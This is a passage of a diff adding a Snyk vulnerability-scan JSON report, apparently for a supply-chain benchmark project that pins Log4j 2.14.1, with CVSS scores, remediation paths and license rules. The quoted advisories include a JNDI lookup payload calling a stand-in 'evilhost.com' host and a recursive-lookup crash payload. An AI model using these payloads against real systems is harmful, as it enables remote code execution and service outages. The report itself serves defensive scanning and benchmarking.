+          "cvssV3BaseScore": 9,
+          "modificationTime": "2024-03-11T09:51:51.455756Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 8.1,
+          "modificationTime": "2024-03-11T09:53:56.296034Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C",
+          "assigner": "Snyk",
+          "severity": "critical",
+          "baseScore": 9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-06T13:59:32.295395Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+          "assigner": "NVD",
+          "severity": "critical",
+          "baseScore": 9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:51:51.455756Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 8.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:56.296034Z"
+        }
+      ],
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) if one of the following conditions is met:\r\n\r\n1. Logging configuration explicitly enables lookups – either by default (if using a version lower than 2.15.0) or manually by using `%m{lookups}` as `formatMsgNoLookups` is switched on by default as of version 2.15.0.\r\n2. Or uses a non-default Pattern Layout with Context Lookup where attackers can control input data via Thread Context Map (MDC),\r\n3. Or uses `Logger.printf(\"%s\", userInput)` function where attackers can control the userInput variable.\r\n\r\nA malicious actor is able to bypass the mitigation implemented in version 2.15.0 that limits JNDI lookups to localhost only: `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`.\r\n\r\nWe recommend updating to version 2.16.0 which completely disables JNDI lookups by default. If upgrading is not an option, this issue can be mitigated in prior releases by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\r\n\r\n### PoC\r\n\r\nIn config:\r\n```\r\n<pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>\r\n```\r\n\r\nIn code:\r\n```java\r\nThreadContext.put(\"loginId\", UserControlledInput);\r\n```\r\n\r\n### History\r\n\r\nThis vulnerability was previously assigned a CVSS score of 3.7 (Low), and the impact was believed to be Denial of Service (DoS).\r\n\r\nFurthermore, the advisory previously mentioned Thread Context Map patterns (%X, %mdc, or %MDC) as being vulnerable to this issue, but that has since been proven wrong.\r\n\r\nOn December 17, 2021 new information came to light, demonstrating that an Arbitrary Code Execution vulnerability still exists in version 2.15.0 of Log4j due to a bypass to the localhost-only lookup mechanism.\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.16.0 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f)\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [Twitter Post](https://twitter.com/marcioalm/status/1471740771581652995)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/cves/2021/CVE-2021-45046.yaml)\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n- [PoC in GitHub](https://github.com/mergebase/log4j-samples)\n",
+      "epssDetails": {
+        "percentile": "0.99948",
+        "probability": "0.94340",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-45046"
+        ],
+        "CWE": [
+          "CWE-94"
+        ],
+        "GHSA": [
+          "GHSA-7rjr-3q55-vv33"
+        ]
+      },
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "proprietary": false,
+      "creationTime": "2021-12-14T18:28:31.339218Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2021-12-14T18:01:28Z",
+      "exploitDetails": {
+        "sources": [
+          "CISA",
+          "Nuclei Templates",
+          "PoC in GitHub",
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "High",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Attacked",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.logging.log4j",
+        "artifactId": "log4j-core"
+      },
+      "publicationTime": "2021-12-14T18:44:00Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-04-09T05:06:25.034357Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "critical",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.16.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2321524",
+      "title": "Denial of Service (DoS)",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
+      "credit": [
+        "Hideki Okamoto of Akamai Technologies"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta9,2.3.1)",
+          "[2.4,2.12.3)",
+          "[2.13.0,2.17.0)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.3.1",
+        "2.12.3",
+        "2.17.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "java",
+      "severity": "high",
+      "cvssScore": 7.5,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "references": [
+        {
+          "url": "https://logging.apache.org/log4j/2.x/security.html",
+          "title": "Apache Security"
+        },
+        {
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3230",
+          "title": "JIRA Issue"
+        },
+        {
+          "url": "https://github.com/cckuailong/Log4j_dos_CVE-2021-45105",
+          "title": "PoC in GitHub"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 5.9,
+          "modificationTime": "2024-03-11T09:51:51.570474Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 5.9,
+          "modificationTime": "2024-03-11T09:53:58.516498Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-06T13:59:38.288854Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "NVD",
+          "severity": "medium",
+          "baseScore": 5.9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:51:51.570474Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:58.516498Z"
+        }
+      ],
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). Does not protect against uncontrolled recursion from self-referential lookups. \r\n\r\nWhen the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a `StackOverflowError` that will terminate the process.\r\n\r\n### PoC\r\n\r\nIn `log4j.properties`:\r\n```java\r\nappender.console.type = Console\r\nappender.console.name = console\r\nappender.console.layout.type = PatternLayout\r\nappender.console.layout.pattern = !${ctx:test}! %m%n\r\nrootLogger.level = ALL\r\nrootLogger.appenderRef.file.ref = console\r\n```\r\n\r\nIn `Main.java`:\r\n```java\r\nThreadContext.put(\"test\", \"${::-${ctx:test}}\");\r\nlogger.error(\"boom\"); // Will not be logged\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.3, 2.17.0 or higher.\n## References\n- [Apache Security](https://logging.apache.org/log4j/2.x/security.html)\n- [JIRA Issue](https://issues.apache.org/jira/browse/LOG4J2-3230)\n- [PoC in GitHub](https://github.com/cckuailong/Log4j_dos_CVE-2021-45105)\n",
+      "epssDetails": {
+        "percentile": "0.98706",
+        "probability": "0.71364",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-45105"
+        ],
+        "CWE": [
+          "CWE-400"
+        ]
+      },
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "proprietary": false,
+      "creationTime": "2021-12-17T18:23:58.542986Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2021-12-17T18:20:21Z",
+      "exploitDetails": {
+        "sources": [
+          "PoC in GitHub",
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.logging.log4j",
+        "artifactId": "log4j-core"
+      },
+      "publicationTime": "2021-12-18T07:05:00Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2025-08-14T05:20:07.563909Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.17.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2327339",
+      "title": "Arbitrary Code Execution",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "Unknown"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta7,2.3.2)",
+          "[2.4,2.12.4)",
+          "[2.13.0,2.17.1)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.3.2",
+        "2.12.4",
+        "2.17.1"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "java",
+      "severity": "medium",
+      "cvssScore": 6.6,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "references": [
+        {
+          "url": "https://logging.apache.org/log4j/2.x/security.html",
+          "title": "Apache Security Page"
+        },
+        {
+          "url": "https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3293",
+          "title": "Jira Issue"
+        },
+        {
+          "url": "https://www.openwall.com/lists/oss-security/2021/12/28/1",
+          "title": "Openwall Mail"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 6.6,
+          "modificationTime": "2024-03-11T09:48:51.766965Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 6.6,
+          "modificationTime": "2024-03-11T09:53:58.472982Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.6,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-06T14:04:47.220633Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "NVD",
+          "severity": "medium",
+          "baseScore": 6.6,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:48:51.766965Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 6.6,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:58.472982Z"
+        }
+      ],
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. <br /> **Note:** Even though this vulnerability appears to be related to the [log4Shell vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), this vulnerability requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nAn attacker with access to modification of logging configuration is able to configure `JDBCAppender` with a data source referencing a JNDI URI - which can execute malicious code.\r\n\r\nIn the fixed versions, `JDBCAppender` is using `JndiManager` and disables JNDI lookups by default (via `log4j2.enableJndiJdbc=false`).\r\n\r\n## Alternative Remediation\r\nIf you have reason to believe your application may be vulnerable and upgrading is not an option, you can either:\r\n\r\n* Disable/remove `JDBCAppender`\r\n* If `JDBCAppender` is used, make sure that it is not configured to use any protocol other than Java\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.2, 2.12.4, 2.17.1 or higher.\n## References\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-3293)\n- [Openwall Mail](https://www.openwall.com/lists/oss-security/2021/12/28/1)\n",
+      "epssDetails": {
+        "percentile": "0.97962",
+        "probability": "0.53648",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-44832"
+        ],
+        "CWE": [
+          "CWE-94"
+        ]
+      },
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "proprietary": false,
+      "creationTime": "2021-12-28T19:42:55.818691Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2021-12-28T19:42:53Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.logging.log4j",
+        "artifactId": "log4j-core"
+      },
+      "publicationTime": "2021-12-28T20:17:52Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2024-03-11T09:53:58.472982Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.17.1"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    }
+  ],
+  "ok": false,
+  "dependencyCount": 4,
+  "org": "selvinm95",
+  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
+  "isPrivate": true,
+  "licensesPolicy": {
+    "severities": {},
+    "orgLicenseRules": {
+      "AGPL-1.0": {
+        "licenseType": "AGPL-1.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "AGPL-3.0": {
+        "licenseType": "AGPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "Artistic-1.0": {
+        "licenseType": "Artistic-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "Artistic-2.0": {
+        "licenseType": "Artistic-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CDDL-1.0": {
+        "licenseType": "CDDL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CPOL-1.02": {
+        "licenseType": "CPOL-1.02",
+        "severity": "high",
+        "instructions": ""
+      },
+      "EPL-1.0": {
+        "licenseType": "EPL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "GPL-2.0": {
+        "licenseType": "GPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "GPL-3.0": {
+        "licenseType": "GPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "LGPL-2.0": {
+        "licenseType": "LGPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-2.1": {
+        "licenseType": "LGPL-2.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-3.0": {
+        "licenseType": "LGPL-3.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-1.1": {
+        "licenseType": "MPL-1.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-2.0": {
+        "licenseType": "MPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MS-RL": {
+        "licenseType": "MS-RL",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "SimPL-2.0": {
+        "licenseType": "SimPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      }
+    }
+  },
+  "packageManager": "maven",
+  "ignoreSettings": {
+    "adminOnly": false,
+    "reasonRequired": false,
+    "disregardFilesystemIgnores": false
+  },
+  "summary": "7 vulnerable dependency paths",
+  "remediation": {
+    "unresolved": [],
+    "upgrade": {
+      "org.apache.commons:commons-text@1.9": {
+        "upgradeTo": "org.apache.commons:commons-text@1.14.0",
+        "upgrades": [
+          "org.apache.commons:commons-lang3@3.11",
+          "org.apache.commons:commons-text@1.9"
+        ],
+        "vulns": [
+          "SNYK-JAVA-ORGAPACHECOMMONS-10734078",
+          "SNYK-JAVA-ORGAPACHECOMMONS-3043138"
+        ]
+      },
+      "org.apache.logging.log4j:log4j-core@2.14.1": {
+        "upgradeTo": "org.apache.logging.log4j:log4j-core@2.25.3",
+        "upgrades": [
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1"
+        ],
+        "vulns": [
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-14532782",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2327339",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2321524",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2320014",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720"
+        ]
+      }
+    },
+    "patch": {},
+    "ignore": {},
+    "pin": {}
+  },
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 7,
+  "projectName": "com.benchmark:vuln-directa-n1",
+  "displayTargetFile": "pom.xml",
+  "hasUnknownVersions": false,
+  "path": "C:\\DevOpsAI\\supply_chain_agentic_v2\\supply_chain_agentic_v2\\proyecto_agentico\\benchmark\\benchmark-projects\\01_direct_vuln_n1"
+}
